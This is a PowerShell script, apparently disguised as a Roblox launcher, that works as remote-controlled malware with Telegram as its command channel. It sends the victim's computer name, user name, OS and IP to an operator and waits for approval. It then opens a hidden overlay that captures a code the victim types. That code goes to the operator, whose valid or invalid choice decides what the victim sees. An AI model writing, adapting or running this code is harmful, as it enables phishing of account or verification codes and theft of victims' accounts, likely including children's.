[Net.ServicePointManager]::SecurityProtocol = 3072
$d = "$env:APPDATA\RbxLaunch"

# Single-instance lock
$lockFile = "$d\launcher.lock"
if (Test-Path $lockFile) {
    $pid2 = Get-Content $lockFile -ErrorAction SilentlyContinue
    if ($pid2 -and (Get-Process -Id $pid2 -ErrorAction SilentlyContinue)) { exit }
}
$PID | Out-File $lockFile -Force
try {

$ini = @{}
Get-Content "$d\config.ini" -Encoding UTF8 | ForEach-Object {
    if ($_ -match '^([^=]+)=(.+)$') { $ini[$Matches[1].Trim()] = $Matches[2].Trim() }
}
$tok = $ini['token']
$cid = $ini['chat_id']
$oid = $ini['owner_id']

function Tg($ep, $json) {
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes($json)
        $req = [Net.WebRequest]::Create("https://api.telegram.org/bot$tok/$ep")
        $req.Method = 'POST'; $req.ContentType = 'application/json; charset=utf-8'; $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes, 0, $bytes.Length); $s.Close()
        (New-Object IO.StreamReader($req.GetResponse().GetResponseStream(), [Text.Encoding]::UTF8)).ReadToEnd() | ConvertFrom-Json
    } catch {}
}

function Poll($offset) {
    try {
        $url = "https://api.telegram.org/bot$tok/getUpdates?offset=$offset&timeout=5&allowed_updates=%5B%22callback_query%22%5D"
        (New-Object Net.WebClient).DownloadString($url) | ConvertFrom-Json
    } catch { $null }
}

function CheckSubmitted {
    try {
        $r = [Net.WebRequest]::Create('http://127.0.0.1:7823/submitted')
        $r.Timeout = 1000
        $resp = $r.GetResponse()
        $status = [int]$resp.StatusCode
        if ($status -eq 200) {
            $body = (New-Object IO.StreamReader $resp.GetResponseStream()).ReadToEnd()
            $resp.Close()
            return $body
        }
        $resp.Close()
        return $false
    } catch { return $false }
}

# Flush stale updates — get highest known update_id and skip past it
try {
    $flushUrl = "https://api.telegram.org/bot$tok/getUpdates?timeout=0"
    $flushRes = ((New-Object Net.WebClient).DownloadString($flushUrl) | ConvertFrom-Json).result
    $offset = if ($flushRes -and $flushRes.Count -gt 0) { $flushRes[-1].update_id + 1 } else { 0 }
    if ($offset -gt 0) {
        # Acknowledge flush so those updates are marked read
        (New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$tok/getUpdates?offset=$offset&timeout=0") | Out-Null
    }
} catch { $offset = 0 }

# PC info
$localip = try {
    $u = New-Object Net.Sockets.UdpClient; $u.Connect('8.8.8.8', 80)
    $ip = $u.Client.LocalEndPoint.Address; $u.Close(); $ip
} catch { 'unavailable' }

# Escape for JSON (no literal newlines in strings)
$infoJson = "Host: $env:COMPUTERNAME\nUser: $env:USERNAME\nOS: $([Environment]::OSVersion.Version)\nIP: $localip"

# Approval gate
Tg 'sendMessage' "{`"chat_id`":`"$oid`",`"text`":`"Execution requested - approve?\n\n$infoJson`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Approve`",`"callback_data`":`"approve`"},{`"text`":`"Deny`",`"callback_data`":`"deny`"}]]}}"

$approved = $null
while ($null -eq $approved) {
    $data = Poll $offset
    if ($data -and $data.result) {
        foreach ($upd in $data.result) {
            $offset = $upd.update_id + 1
            $cb = $upd.callback_query
            if (!$cb) { continue }
            if ($cb.data -eq 'approve') { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Approved`"}"; $approved = $true; break }
            if ($cb.data -eq 'deny')    { Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Denied`"}";   $approved = $false; break }
        }
    }
}
if (-not $approved) { exit }

# Theme picker
Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Choose overlay theme:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Light`",`"callback_data`":`"theme_light`"},{`"text`":`"Dark`",`"callback_data`":`"theme_dark`"}]]}}"

$theme = $null
while ($null -eq $theme) {
    $data = Poll $offset
    if ($data -and $data.result) {
        foreach ($upd in $data.result) {
            $offset = $upd.update_id + 1
            $cb = $upd.callback_query
            if ($cb -and $cb.data -like 'theme_*') {
                $theme = $cb.data -replace 'theme_', ''
                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Launching $theme overlay...`"}"
                break
            }
        }
    }
}

$overlayExe = "$d\overlay\overlay.exe"
Start-Process $overlayExe -ArgumentList $theme -WindowStyle Hidden
Start-Sleep 3
Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Overlay opened - waiting for code...`"}"

$waitingForOutcome = $false
while ($true) {
    if (-not $waitingForOutcome) {
        $submittedCode = CheckSubmitted
        if ($submittedCode -ne $false) {
            $waitingForOutcome = $true
            $codeLine = if ($submittedCode) { "\nCode: $submittedCode" } else { '' }
            Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"Code submitted$codeLine\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"Valid`",`"callback_data`":`"valid`"},{`"text`":`"Invalid`",`"callback_data`":`"invalid`"}]]}}"
        }
    }
    $data = Poll $offset
    if ($data -and $data.result) {
        foreach ($upd in $data.result) {
            $offset = $upd.update_id + 1
            $cb = $upd.callback_query
            if (!$cb) { continue }
            if ($cb.data -eq 'valid') {
                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Overlay closed`"}"
                try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/valid') } catch {}
                $waitingForOutcome = $false
            }
            if ($cb.data -eq 'invalid') {
                Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"Error shown`"}"
                try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/invalid') } catch {}
                $waitingForOutcome = $false
            }
        }
    }
    Start-Sleep 1
}
} finally {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
}
